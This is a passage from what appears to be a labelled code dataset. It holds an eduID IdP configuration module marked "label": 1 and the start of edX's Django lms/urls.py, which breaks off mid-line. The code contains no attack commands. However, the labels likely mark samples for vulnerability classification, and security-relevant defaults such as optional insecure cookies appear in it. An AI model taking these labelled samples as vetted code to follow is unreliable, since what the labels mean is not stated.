use in source and binary forms, with or\n#   without modification, are permitted provided that the following\n#   conditions are met:\n#\n#     1. Redistributions of source code must retain the above copyright\n#        notice, this list of conditions and the following disclaimer.\n#     2. Redistributions in binary form must reproduce the above\n#        copyright notice, this list of conditions and the following\n#        disclaimer in the documentation and/or other materials provided\n#        with the distribution.\n#     3. Neither the name of the NORDUnet nor the names of its\n#        contributors may be used to endorse or promote products derived\n#        from this software without specific prior written permission.\n#\n# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS\n# \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT\n# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS\n# FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE\n# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,\n# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,\n# BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\n# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT\n# LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN\n# ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE\n# POSSIBILITY OF SUCH DAMAGE.\n#\n# Author : Fredrik Thulin <fredrik@thulin.net>\n#\n\"\"\"\nConfiguration (file) handling for eduID IdP.\n\"\"\"\n\nimport os\nimport ConfigParser\n\n_CONFIG_DEFAULTS = {'debug': False,  # overwritten in IdPConfig.__init__()\n                    'syslog_debug': '0',              # '1' for True, '0' for False\n                    'num_threads': '8',\n                    'logdir': None,\n                    'logfile': None,\n                    'syslog_socket': None,            # syslog socket to log to (/dev/log maybe)\n                    'listen_addr': '0.0.0.0',\n                    'listen_port': '8088',\n                    'pysaml2_config': 'idp_conf.py',  # path prepended in IdPConfig.__init__()\n                    'fticks_secret_key': None,\n                    'fticks_format_string': 'F-TICKS/SWAMID/2.0#TS={ts}#RP={rp}#AP={ap}#PN={pn}#AM={am}#',\n                    'static_dir': None,\n                    'ssl_adapter': 'builtin',  # one of cherrypy.wsgiserver.ssl_adapters\n                    'server_cert': None,  # SSL cert filename\n                    'server_key': None,   # SSL key filename\n                    'cert_chain': None,   # SSL certificate chain filename, or None\n                    'userdb_mongo_uri': None,\n                    'userdb_mongo_database': None,\n                    'sso_session_lifetime': '15',  # Lifetime of SSO session in minutes\n                    'sso_session_mongo_uri': None,\n                    'raven_dsn': None,\n                    'content_packages': [],  # List of Python packages (\"name:path\") with content resources\n                    'verify_request_signatures': '0',  # '1' for True, '0' for False\n                    'status_test_usernames': [],\n                    'signup_link': '#',  # for login.html\n                    'dashboard_link': '#',  # for forbidden.html\n                    'password_reset_link': '#',  # for login.html\n                    'default_language': 'en',\n                    'base_url': None,\n                    'default_eppn_scope': None,\n                    'authn_info_mongo_uri': None,\n                    'max_authn_failures_per_month': '50',  # Kantara 30-day bad authn limit is 100\n                    'login_state_ttl': '5',   # time to complete an IdP login, in minutes\n                    'default_scoped_affiliation': None,\n                    'vccs_url': 'http://localhost:8550/',    # VCCS backend URL\n                    'insecure_cookies': '0',                     # Set to 1 to not set HTTP Cookie 'secure' flag\n                    }\n\n_CONFIG_SECTION = 'eduid_idp'\n\n\nclass IdPConfig(object):\n\n    \"\"\"\n    Class holding IdP application configuration.\n\n    Loads configuration from an INI-file at instantiation.\n\n    :param filename: string, INI-file name\n    :param debug: boolean, default debug value\n    :raise ValueError: if INI-file can't be parsed\n    \"\"\"\n\n    def __init__(self, filename, debug):\n        self._parsed_content_packages = None\n        self._parsed_status_test_usernames = None\n        self.section = _CONFIG_SECTION\n        _CONFIG_DEFAULTS['debug'] = str(debug)\n        cfgdir = os.path.dirname(filename)\n        _CONFIG_DEFAULTS['pysaml2_config'] = os.path.join(cfgdir, _CONFIG_DEFAULTS['pysaml2_config'])\n        self.config = ConfigParser.ConfigParser(_CONFIG_DEFAULTS)\n        if not self.config.read([filename]):\n            raise ValueError(\"Failed loading config file {!r}\".format(filename))\n\n    @property\n    def num_threads(self):\n        \"\"\"\n        Number of worker threads to start (integer).\n\n        EduID IdP spawns multiple threads to make use of all CPU cores in the password\n        pre-hash function.\n        Number of threads should probably be about 2x number of cores to 4x number of\n        cores (if hyperthreading is available).\n        \"\"\"\n        return self.config.getint(self.section, 'num_threads')\n\n    @property\n    def logdir(self):\n        \"\"\"\n        Path to CherryPy logfiles (string). Something like '/var/log/idp' maybe.\n        \"\"\"\n        res = self.config.get(self.section, 'logdir')\n        if not res:\n            res = None\n        return res\n\n    @property\n    def logfile(self):\n        \"\"\"\n        Path to application logfile. Something like '/var/log/idp/eduid_idp.log' maybe.\n        \"\"\"\n        res = self.config.get(self.section, 'logfile')\n        if not res:\n            res = None\n        return res\n\n    @property\n    def syslog_socket(self):\n        \"\"\"\n        Syslog socket to log to (string). Something like '/dev/log' maybe.\n        \"\"\"\n        res = self.config.get(self.section, 'syslog_socket')\n        if not res:\n            res = None\n        return res\n\n    @property\n    def debug(self):\n        \"\"\"\n        Set to True to log debug messages (boolean).\n        \"\"\"\n        return self.config.getboolean(self.section, 'debug')\n\n    @property\n    def syslog_debug(self):\n        \"\"\"\n        Set to True to log debug messages to syslog (also requires syslog_socket) (boolean).\n        \"\"\"\n        return self.config.getboolean(self.section, 'syslog_debug')\n\n    @property\n    def listen_addr(self):\n        \"\"\"\n        IP address to listen on.\n        \"\"\"\n        return self.config.get(self.section, 'listen_addr')\n\n    @property\n    def listen_port(self):\n        \"\"\"\n        The port the IdP authentication should listen on (integer).\n        \"\"\"\n        return self.config.getint(self.section, 'listen_port')\n\n    @property\n    def pysaml2_config(self):\n        \"\"\"\n        pysaml2 configuration file. Separate config file with SAML related parameters.\n        \"\"\"\n        return self.config.get(self.section, 'pysaml2_config')\n\n    @property\n    def fticks_secret_key(self):\n        \"\"\"\n        SAML F-TICKS user anonymization key. If this is set, the IdP will log FTICKS data\n        on every login.\n        \"\"\"\n        return self.config.get(self.section, 'fticks_secret_key')\n\n    @property\n    def fticks_format_string(self):\n        \"\"\"\n        Get SAML F-TICKS format string.\n        \"\"\"\n        return self.config.get(self.section, 'fticks_format_string')\n\n    @property\n    def static_dir(self):\n        \"\"\"\n        Directory with static files to be served.\n        \"\"\"\n        return self.config.get(self.section, 'static_dir')\n\n    @property\n    def ssl_adapter(self):\n        \"\"\"\n        CherryPy SSL adapter class to use (must be one of cherrypy.wsgiserver.ssl_adapters)\n        \"\"\"\n        return self.config.get(self.section, 'ssl_adapter')\n\n    @property\n    def server_cert(self):\n        \"\"\"\n        SSL certificate filename (None == SSL disabled)\n        \"\"\"\n        return self.config.get(self.section, 'server_cert')\n\n    @property\n    def server_key(self):\n        \"\"\"\n        SSL private key filename (None == SSL disabled)\n        \"\"\"\n        return self.config.get(self.section, 'server_key')\n\n    @property\n    def cert_chain(self):\n        \"\"\"\n        SSL certificate chain filename\n        \"\"\"\n        return self.config.get(self.section, 'cert_chain')\n\n    @property\n    def userdb_mongo_uri(self):\n        \"\"\"\n        UserDB MongoDB connection URI (string). See MongoDB documentation for details.\n        \"\"\"\n        return self.config.get(self.section, 'userdb_mongo_uri')\n\n    @property\n    def userdb_mongo_database(self):\n        \"\"\"\n        UserDB database name.\n        \"\"\"\n        return self.config.get(self.section, 'userdb_mongo_database')\n\n    @property\n    def sso_session_lifetime(self):\n        \"\"\"\n        Lifetime of SSO session (in minutes).\n\n        If a user has an active SSO session, they will get SAML assertions made\n        without having to authenticate again (unless SP requires it through\n        ForceAuthn).\n\n        The total time a user can access a particular SP would therefor be\n        this value, plus the pysaml2 lifetime of the assertion.\n        \"\"\"\n        return self.config.getint(self.section, 'sso_session_lifetime')\n\n    @property\n    def sso_session_mongo_uri(self):\n        \"\"\"\n        SSO session MongoDB connection URI (string). See MongoDB documentation for details.\n\n        If not set, an in-memory SSO session cache will be used.\n        \"\"\"\n        return self.config.get(self.section, 'sso_session_mongo_uri')\n\n    @property\n    def raven_dsn(self):\n        \"\"\"\n        Raven DSN (string) for logging exceptions to Sentry.\n        \"\"\"\n        return self.config.get(self.section, 'raven_dsn')\n\n    @property\n    def content_packages(self):\n        \"\"\"\n        Get list of tuples with packages and paths to content resources, such as login.html.\n\n        The expected format in the INI file is\n\n            content_packages = pkg1:some/path/, pkg2:foo\n\n        :return: list of (pkg, path) tuples\n        \"\"\"\n        if self._parsed_content_packages:\n            return self._parsed_content_packages\n        value = self.config.get(self.section, 'content_packages')\n        res = []\n        for this in value.split(','):\n            this = this.strip()\n            name, _sep, path, = this.partition(':')\n            res.append((name, path))\n        self._parsed_content_packages = res\n        return res\n\n    @property\n    def verify_request_signatures(self):\n        \"\"\"\n        Verify request signatures, if they exist.\n\n        This defaults to False since it is a trivial DoS to consume all the IdP:s\n        CPU resources if this is set to True.\n        \"\"\"\n        res = self.config.get(self.section, 'verify_request_signatures')\n        return bool(int(res))\n\n    @property\n    def status_test_usernames(self):\n        \"\"\"\n        Get list of usernames valid for use with the /status URL.\n\n        If this list is ['*'], all usernames are allowed for /status.\n\n        :return: list of usernames\n\n        :rtype: list[string]\n        \"\"\"\n        if self._parsed_status_test_usernames:\n            return self._parsed_status_test_usernames\n        value = self.config.get(self.section, 'status_test_usernames')\n        res = [x.strip() for x in value.split(',')]\n        self._parsed_status_test_usernames = res\n        return res\n\n    @property\n    def signup_link(self):\n        \"\"\"\n        URL (string) for use in simple templating of login.html.\n        \"\"\"\n        return self.config.get(self.section, 'signup_link')\n\n    @property\n    def dashboard_link(self):\n        \"\"\"\n        URL (string) for use in simple templating of forbidden.html.\n        \"\"\"\n        return self.config.get(self.section, 'dashboard_link')\n\n    @property\n    def password_reset_link(self):\n        \"\"\"\n        URL (string) for use in simple templating of login.html.\n        \"\"\"\n        return self.config.get(self.section, 'password_reset_link')\n\n    @property\n    def default_language(self):\n        \"\"\"\n        Default language code to use when looking for web pages ('en').\n        \"\"\"\n        return self.config.get(self.section, 'default_language')\n\n    @property\n    def base_url(self):\n        \"\"\"\n        Base URL of the IdP. The default base URL is constructed from the\n        Request URI, but for example if there is a load balancer/SSL\n        terminator in front of the IdP it might be required to specify\n        the URL of the service.\n        \"\"\"\n        return self.config.get(self.section, 'base_url')\n\n    @property\n    def default_eppn_scope(self):\n        \"\"\"\n        The scope to append to any unscoped eduPersonPrincipalName\n        attributes found on users in the userdb.\n        \"\"\"\n        return self.config.get(self.section, 'default_eppn_scope')\n\n    @property\n    def authn_info_mongo_uri(self):\n        \"\"\"\n        Authn info (failed logins etc.) MongoDB connection URI (string).\n        See MongoDB documentation for details.\n\n        If not set, Kantara authn logs will not be maintained.\n        \"\"\"\n        return self.config.get(self.section, 'authn_info_mongo_uri')\n\n    @property\n    def max_authn_failures_per_month(self):\n        \"\"\"\n        Disallow login for a user after N failures in a given month.\n\n        This is said to be an imminent Kantara requirement.\n        \"\"\"\n        return self.config.getint(self.section, 'max_authn_failures_per_month')\n\n    @property\n    def login_state_ttl(self):\n        \"\"\"\n        Lifetime of state kept in IdP login phase.\n\n        This is the time, in minutes, a user has to complete the login phase.\n        After this time, login cannot complete because the SAMLRequest, RelayState\n        and possibly other needed information will be forgotten.\n        \"\"\"\n        return self.config.getint(self.section, 'login_state_ttl')\n\n    @property\n    def default_scoped_affiliation(self):\n        \"\"\"\n        Add a default eduPersonScopedAffiliation if none is returned from the\n        attribute manager.\n        \"\"\"\n        return self.config.get(self.section, 'default_scoped_affiliation')\n\n    @property\n    def vccs_url(self):\n        \"\"\"\n        URL to use with VCCS client. BCP is to have an nginx or similar on\n        localhost that will proxy requests to a currently available backend\n        using TLS.\n        \"\"\"\n        return self.config.get(self.section, 'vccs_url')\n\n    @property\n    def insecure_cookies(self):\n        \"\"\"\n        Set to True to NOT set HTTP Cookie 'secure' flag (boolean).\n        \"\"\"\n        return self.config.getboolean(self.section, 'insecure_cookies')\n/n/n/n", "label": 1}, {"id": "4e4c209ae3deb4c78bcec89c181516af8604b450", "code": "lms/urls.py/n/nfrom django.conf import settings\nfrom django.conf.urls import patterns, include, url\nfrom django.contrib import admin\nfrom django.conf.urls.static import static\n\n# Not used, the work is done in the imported module.\nfrom . import one_time_startup      # pylint: disable=W0611\n\nimport django.contrib.auth.views\n\n# Uncomment the next two lines to enable the admin:\nif settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):\n    admin.autodiscover()\n\nurlpatterns = ('',  # nopep8\n    # certificate view\n\n    url(r'^update_certificate$', 'certificates.views.update_certificate'),\n    url(r'^$', 'branding.views.index', name=\"root\"),   # Main marketing page, or redirect to courseware\n    url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"),\n    url(r'^login$', 'student.views.signin_user', name=\"signin_user\"),\n    url(r'^register$', 'student.views.register_user', name=\"register_user\"),\n\n    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),\n\n    url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"),\n    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),\n    url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"),\n    url(r'^accept_name_change$', 'student.views.accept_name_change'),\n    url(r'^reject_name_change$', 'student.views.reject_name_change'),\n    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),\n    url(r'^event$', 'track.views.user_track'),\n    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?\n\n    url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"),\n\n    url(r'^login_ajax$', 'student.views.login_user', name=\"login\"),\n    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),\n    url(r'^logout$', 'student.views.logout_user', name='logout'),\n    url(r'^create_account$', 'student.views.create_account'),\n    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"),\n\n    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"),\n    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),\n\n    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),\n    ## Obsolete Django views for password resets\n    ## TODO: Replace with Mako-ized views\n    url(r'^password_change/$', django.contrib.auth.views.password_change,\n        name='auth_password_change'),\n    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,\n        name='auth_password_change_done'),\n    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',\n        'student.views.password_reset_confirm_wrapper',\n        name='auth_password_reset_confirm'),\n    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,\n        name='auth_password_reset_complete'),\n    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,\n        name='auth_password_reset_done'),\n\n    url(r'^heartbeat$', include('heartbeat.urls')),\n)\n\n# University profiles only make sense in the default edX context\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        ##\n        ## Only universities without courses should be included here.  If\n        ## courses exist, the dynamic profile rule below should win.\n        ##\n        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}),\n        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}),\n        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}),\n        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}),\n        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}),\n        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',\n            name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}),\n\n        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',\n            name=\"university_profile\"),\n    )\n\n#Semi-static views (these need to be rendered and have the login bar, but don't change)\nurlpatterns += (\n    url(r'^404$', 'static_template_view.views.render',\n        {'template': '404.html'}, name=\"404\"),\n)\n\n# Semi-static views only used by edX, not by themes\nif not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n    urlpatterns += (\n        url(r'^jobs$', 'static_template_view.views.render',\n            {'template': 'jobs.html'}, name=\"jobs\"),\n        url(r'^press$', 'student.views.press', name=\"press\"),\n        url(r'^media-kit$', 'static_template_view.views.render',\n            {'template': 'media-kit.html'}, name=\"media-kit\"),\n        url(r'^faq$', 'static_template_view.views.render',\n            {'template': 'faq.html'}, name=\"faq_edx\"),\n        url(r'^help$', 'static_template_view.views.render',\n            {'template': 'help.html'}, name=\"help_edx\"),\n\n        # TODO: (bridger) The copyright has been removed until it is updated for edX\n        # url(r'^copyright$', 'static_template_view.views.render',\n        #     {'template': 'copyright.html'}, name=\"copyright\"),\n\n        #Press releases\n        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),\n\n        # Favicon\n        (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),\n\n        url(r'^submit_feedback$', 'util.views.submit_feedback'),\n\n    )\n\n# Only enable URLs for those marketing links actually enabled in the\n# settings. Disable URLs by marking them as None.\nfor key, value in settings.MKTG_URL_LINK_MAP.items():\n    # Skip disabled URLs\n    if value is None:\n        continue\n\n    # These urls are enabled separately\n    if key == \"ROOT\" or key == \"COURSES\" or key == \"FAQ\":\n        continue\n\n    # Make the assumptions that the templates are all in the same dir\n    # and that they all match the name of the key (plus extension)\n    template = \"%s.html\" % key.lower()\n\n    # To allow theme templates to inherit from default templates,\n    # prepend a standard prefix\n    if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]:\n        template = \"theme-\" + template\n\n    # Make the assumption that the URL we want is the lowercased\n    # version of the map key\n    urlpatterns += (url(r'^%s' % key.lower(),\n                        'static_template_view.views.render',\n                        {'template': template}, name=value),)\n\n\nif settings.PERFSTATS:\n    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)\n\n# Multicourse wiki (Note: wiki urls must be above the courseware ones because of\n# the custom tab catch-all)\nif settings.WIKI_ENABLED:\n    from wiki.urls import get_pattern as wiki_pattern\n    from django_notify.urls import get_pattern as notify_pattern\n\n    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update\n    # them together.\n    urlpatterns += (\n        # First we include views from course_wiki that we use to override the default views.\n        # They come first in the urlpatterns so they get resolved first\n        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),\n        url(r'^wiki/', include(wiki_pattern())),\n        url(r'^notify/', include(notify_pattern())),\n\n        # These urls are for viewing the wiki in the context of a course. They should\n        # never be returned by a reverse() so they come after the other url patterns\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',\n            'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"),\n        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),\n    )\n\n\nif settings.COURSEWARE_ENABLED:\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',\n            'courseware.views.jump_to', name=\"jump_to\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.modx_dispatch',\n            name='modx_dispatch'),\n\n\n        # Software Licenses\n\n        # TODO: for now, this is the endpoint of an ajax replay\n        # service that retrieve and assigns license numbers for\n        # software assigned to a course. The numbers have to be loaded\n        # into the database.\n        url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',\n            'courseware.module_render.xqueue_callback',\n            name='xqueue_callback'),\n        url(r'^change_setting$', 'student.views.change_setting',\n            name='change_setting'),\n\n        # TODO: These views need to be updated before they work\n        url(r'^calculate$', 'util.views.calculate'),\n        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki\n        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),\n        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),\n\n        url(r'^courses/?$', 'branding.views.courses', name=\"courses\"),\n        url(r'^change_enrollment$',\n            'student.views.change_enrollment', name=\"change_enrollment\"),\n\n        #About the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',\n            'courseware.views.course_about', name=\"about_course\"),\n        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n        #View for mktg site\n        url(r'^mktg/(?P<course_id>.*)$',\n            'courseware.views.mktg_course_about', name=\"mktg_about_course\"),\n\n\n\n        #Inside the course\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',\n            'courseware.views.course_info', name=\"course_root\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',\n            'courseware.views.course_info', name=\"info\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n            'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n            'staticbook.views.index', name=\"book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.index'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$',\n            'staticbook.views.index_shifted'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n            'staticbook.views.pdf_index', name=\"pdf_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n            'staticbook.views.html_index', name=\"html_book\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n            'courseware.views.index', name=\"courseware\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_chapter\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$',\n            'courseware.views.index', name=\"courseware_section\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$',\n            'courseware.views.index', name=\"courseware_position\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$',\n            'courseware.views.progress', name=\"progress\"),\n        # Takes optional student_id for instructor use--shows profile as that student sees it.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$',\n            'courseware.views.progress', name=\"student_progress\"),\n\n        # For the instructor\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$',\n            'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$',\n            'instructor.views.gradebook', name='gradebook'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$',\n            'instructor.views.grade_summary', name='grade_summary'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$',\n            'open_ended_grading.views.staff_grading', name='staff_grading'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$',\n            'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$',\n            'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$',\n            'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'),\n\n        # Open Ended problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$',\n            'open_ended_grading.views.student_problem_list', name='open_ended_problems'),\n\n        # Open Ended flagged problem list\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$',\n            'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$',\n            'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'),\n\n        # Cohorts management\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$',\n            'course_groups.views.list_cohorts', name=\"cohorts\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$',\n            'course_groups.views.add_cohort',\n            name=\"add_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$',\n            'course_groups.views.users_in_cohort',\n            name=\"list_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$',\n            'course_groups.views.add_users_to_cohort',\n            name=\"add_to_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$',\n            'course_groups.views.remove_user_from_cohort',\n            name=\"remove_from_cohort\"),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$',\n            'course_groups.views.debug_cohort_mgmt',\n            name=\"debug_cohort_mgmt\"),\n\n        # Open Ended Notifications\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$',\n            'open_ended_grading.views.combined_notifications', name='open_ended_notifications'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$',\n            'open_ended_grading.views.peer_grading', name='peer_grading'),\n\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'),\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),\n\n    )\n\n    # allow course staff to change to student view of courseware\n    if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'):\n        urlpatterns += (\n            url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"),\n        )\n\n    # discussion forums live within courseware, so courseware must be enabled first\n    if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$',\n                'courseware.views.news', name=\"news\"),\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/',\n                include('django_comment_client.urls'))\n        )\n    urlpatterns += (\n        # This MUST be the last view in the courseware--it's a catch-all for custom tabs.\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$',\n        'courseware.views.static_tab', name=\"static_tab\"),\n    )\n\n    if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'):\n        urlpatterns += (\n            url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$',\n                'courseware.views.submission_history',\n                name='submission_history'),\n        )\n\n\nif settings.ENABLE_JASMINE:\n    urlpatterns += (url(r'^_jasmine/', include('django_jasmine.urls')),)\n\nif settings.DEBUG or 